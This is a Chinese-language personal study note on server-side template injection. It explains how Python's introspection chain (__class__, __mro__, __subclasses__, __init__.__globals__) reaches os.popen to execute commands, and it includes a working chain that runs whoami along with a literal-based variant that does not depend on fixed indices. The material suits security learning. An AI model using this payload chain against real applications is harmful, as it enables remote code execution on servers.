---
title: SSTI
date: 2026-11-23
---
# SSTI

创建时间：2026-11-23

# 一、模板的概念
模板是预先写好的文本框架，里面用占位符留出位置。渲染时，模板引擎把传入的数据填进占位符，输出最终文本。格式由模板决定。
关键是：**占位符里的内容会被引擎当成表达式求值**，而不只是替换字符串。
# 二、SSTI 触发原理
用户可控的输入被拼接进**模板源码**，渲染时被当作模板语法解析并求值。如果模板引擎没有启用沙箱、也没有限制属性访问，攻击者就能在模板里执行任意表达式，读取对象属性、调用函数，最终执行系统命令（RCE）。
注意区分：
- 输入作为**数据**传给模板是安全的（会被当字符串处理）；
- 输入进入**模板源码位置**才危险。
# 三、类的继承
### `__class__`
返回这个对象所属的类。
```python
class a: pass
class b(a): pass
class c(b): pass
class d(c): pass
obj = c()
print(obj.__class__)
```
输出：
```text
<class '__main__.c'>
```
### `__base__`
返回该类的**直接**父类，只有一个。
```python
print(obj.__class__.__base__)
```
输出：
```text
<class '__main__.b'>
```
再叠一层就是再往上一层父类：
```python
print(obj.__class__.__base__.__base__)
```
输出：
```text
<class '__main__.a'>
```
Python 里所有类最终都继承自 `object`，`object` 本身没有父类。
```python
print(obj.__class__.__base__.__base__.__base__)            # <class 'object'>
print(obj.__class__.__base__.__base__.__base__.__base__)    # None
```
### `__mro__`
返回一个元组，第一个元素是当前类自己，后面依次是全部祖先，按方法解析顺序排列。
```python
print(obj.__class__.__mro__)
```
输出：
```text
(<class '__main__.c'>, <class '__main__.b'>, <class '__main__.a'>, <class 'object'>)
```
因为是元组，可以用下标取指定的类：
```python
print(obj.__class__.__mro__[3])
```
输出：
```text
<class 'object'>
```
### `__subclasses__()`
返回该类的**直接**子类列表，不含孙类。
```python
print(obj.__class__.__mro__[3].__subclasses__())
```
输出（省略）：
```text
[<class 'type'>, <class 'async_generator'>, ...]
```
顺便说明方向：`d` 是 `c` 的子类，它出现在 `c.__subclasses__()` 里，不出现在 `c.__mro__` 里。
# 四、找 os 模块的类
目标是 RCE，要在子类列表里找包含系统命令执行函数的模块。标准库里主要有 `os`、`subprocess`、`pty`。
下标不固定，所以先枚举出来：
```python
for idx, k in enumerate(obj.__class__.__mro__[3].__subclasses__()):
    if k.__module__ == 'os':
        print(idx, k)
```
输出（本机环境）：
```text
143 <class 'os._wrap_close'>
144 <class 'os._AddedDllDirectory'>
```
下标随环境变化，不能写死。
# 五、从类到 popen
`os` 模块里的 `popen()` 能执行系统命令，但 `<class 'os._wrap_close'>` 这个类里并没有 `popen`。
拿到它的方式是：取这个类的 `__init__`，它的 `__globals__` 就是 `os` 模块的全局命名空间字典；用 `'popen'` 作键取出函数对象，再传命令并调用。**不需要实例化这个类。**
```python
print(obj.__class__.__mro__[3].__subclasses__()[143].__init__.__globals__['popen']('whoami').read())
```
输出：
```text
desktop-s2liqu4\22461
```
# 六、不依赖固定下标
实际环境不清楚对方有哪些类、下标是多少。但 Python 里一切都是对象，可以从任意字面量出发：
```python
''.__class__              # <class 'str'>
().__class__              # <class 'tuple'>
[].__class__              # <class 'list'>
{}.__class__              # <class 'dict'>
''.__class__.__mro__      # (<class 'str'>, <class 'object'>)
''.__class__.__mro__[1]   # <class 'object'>
```
到达 `object` 后，`__subclasses__()` 就能枚举到所有已加载模块里的类。
# 七、魔术属性 / 方法总结
| 名称 | 类型 | 作用 |
| --- | --- | --- |
| `__class__` | 属性 | 返回该对象所属的类 |
| `__base__` | 属性（在类上） | 返回该类的直接父类，单个 |
| `__bases__` | 属性（在类上） | 返回直接父类组成的元组 |
| `__mro__` | 属性（在类上） | 返回元组：当前类 + 全部祖先，按解析顺序 |
| `__subclasses__()` | 方法 | 返回该类的直接子类列表 |
| `__init__` | 方法 | 创建实例时自动调用，初始化实例 |
| `__globals__` | 属性（仅 Python 函数有） | 指向该函数所在模块的全局命名空间字典 |
最后一条要注意：C 实现的函数（如 `object.__init__`、`list.__init__`）没有 `__globals__`，属性链在那里断掉。


参考：https://blog.csdn.net/qq_61955196/article/details/132237648 //本文为个人学习笔记
